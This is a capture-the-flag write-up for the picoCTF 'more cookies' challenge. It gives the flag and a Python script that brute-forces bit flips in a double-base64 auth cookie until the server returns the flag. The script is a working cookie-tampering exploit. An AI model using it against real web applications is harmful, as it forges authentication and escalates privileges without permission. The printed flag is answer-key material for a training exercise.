# more cookies
flag: `picoCTF{cO0ki3s_yum_a9a19fa6}`
my approach to the problem:
- what i did was bit-flip attack on a cookie
- the python code makes a get request to the link to get the cookie called `auth_name`
- then the cookie is base64 decoded twice
- then the exploit func flips each byte  to see if the modified version unlocks a response containing the flag
- then a GET request is sent to the server with the modified cookie
- if the response contains `picoCTF{`, then we extract it and print
- ```
    import requests
    import base64
    from tqdm import tqdm
    
    ADDRESS = "http://mercury.picoctf.net:15614/"
    
    s = requests.Session()
    s.get(ADDRESS)
    cookie = s.cookies["auth_name"]
    
    decoded_cookie = base64.b64decode(cookie)
    raw_cookie = base64.b64decode(decoded_cookie)
    
    
    def exploit():
    
        for position_idx in tqdm(range(0, len(raw_cookie))):
    
            for bit_idx in range(0, 8):
                bitflip_guess = (
                        raw_cookie[0:position_idx]
                        + ((raw_cookie[position_idx] ^ (1 << bit_idx)).to_bytes(1, "big"))
                        + raw_cookie[position_idx + 1 :]
                )
    
                guess = base64.b64encode(base64.b64encode(bitflip_guess)).decode()
    
    
                r = requests.get(ADDRESS, cookies={"auth_name": guess})
                if "picoCTF{" in r.text:
                    print(r.text.split("<code>")[1].split("</code>")[0])
                    return
    
    
    exploit()
